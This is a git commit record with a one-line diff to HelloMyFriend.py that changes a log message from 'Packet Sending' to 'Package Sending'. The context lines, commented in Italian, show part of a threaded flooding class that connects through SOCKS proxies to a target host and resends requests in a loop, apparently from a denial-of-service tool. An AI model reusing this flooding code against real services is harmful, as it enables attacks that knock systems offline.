423613a5674d1156544e9b63fee2e969fd79608c
bossy0 <36817786+bossy0@users.noreply.github.com>
2018-04-22 00:14:38 +0300

    Update HelloMyFriend.py

--- HelloMyFriend.py
+++ HelloMyFriend.py
@@ -397,7 +397,7 @@ class tcpfloodsocked(threading.Thread): # la classe del multithreading
 				s = socks.socksocket() # creazione socket
 				s.connect((str(url2),int(port))) # si connette
 				s.send(p) # ed invia
-				print ("Packet Sending " + str(proxy[0]+":"+proxy[1]) + " ✓", self.counter) # print req + counter
+				print ("Package Sending " + str(proxy[0]+":"+proxy[1]) + " ✓", self.counter) # print req + counter
 				try: # invia altre richieste nello stesso thread
 					for y in range(multiple): # fattore di moltiplicazione
 						s.send(str.encode(p)) # encode in bytes della richiesta HTTP
